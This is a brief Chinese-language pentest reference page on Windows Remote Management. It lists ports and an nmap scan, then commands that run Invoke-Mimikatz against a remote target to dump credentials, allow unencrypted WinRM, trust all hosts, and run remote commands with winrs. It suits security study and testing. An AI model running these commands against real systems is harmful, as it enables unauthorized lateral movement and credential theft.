---
title: Windows Remote Management
---

# Windows Remote Management

- 默认端口 HTTP 5985, HTTPS 5986
- Windows Remote Shell (WinRS)
  - Windows 2008+
- 参考
  - https://pentestlab.blog/tag/winrm/

```bash
apk add nmap-scripts nmap-nselibs

nmap -p 5985,5986 -sV 192.168.0.0/24
```

```powershell
Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\ }
Import-Module ./Invoke-Mimikatz.ps1
Invoke-Mimikatz -ComputerName TARGET

Enable-PSRemoting -Force

winrm quickconfig
winrm set winrm/config/Client @{AllowUnencrypted = "true"}
Set-Item WSMan:localhost\client\trustedhosts -value *
```

winrm enumerate winrm/config/Listener

winrm quickconfig -transport:http

```cmd
winrm e winrm/config/listener

# 远程执行
winrs -r:http://WIN-2NE38K15TGH/wsman "cmd"
winrs -r:http://WIN-2NE38K15TGH/wsman "net localgroup administrators"
```
